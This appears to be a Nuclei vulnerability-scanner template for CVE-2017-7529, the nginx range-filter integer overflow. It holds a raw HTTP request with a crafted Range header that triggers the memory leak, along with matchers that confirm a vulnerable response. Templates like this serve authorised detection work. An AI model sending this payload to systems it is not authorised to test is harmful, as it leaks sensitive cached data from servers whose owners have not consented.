id: CVE-2017-7529

info:
  name: Nginx - Integer Overflow
  author: Christopher Calvani
  severity: high
  description: |
    Nginx versions since 0.5.6 up to and including 1.13.2 are vulnerable to integer overflow vulnerability in nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-7529
    - https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2017-7529
    epss-score: 0.96283
    epss-percentile: 99559
    cpe: cpe:2.3:a:f5:nginx:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: f5
    product: nginx
    shodan-query: vuln:CVE-2017-7529
  tags: cve2017,cve,nginx,int-overflow
  
http:
  - method: GET
    path:
      - "{{BaseURL}}"

  - raw:
    - |
        GET / HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
        Range: bytes=-1217,-9223372036854774591
     
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 206
        
      - type: word
        words:
          - 'multipart/byteranges'
          - 'HIT'
        condition: and
        part: header
        
      - type: regex
        part: body
        regex: 
          - "--[0-9]+"
        
      - type: dsl
        dsl:
          - 'len(body) > 1200'
        

        
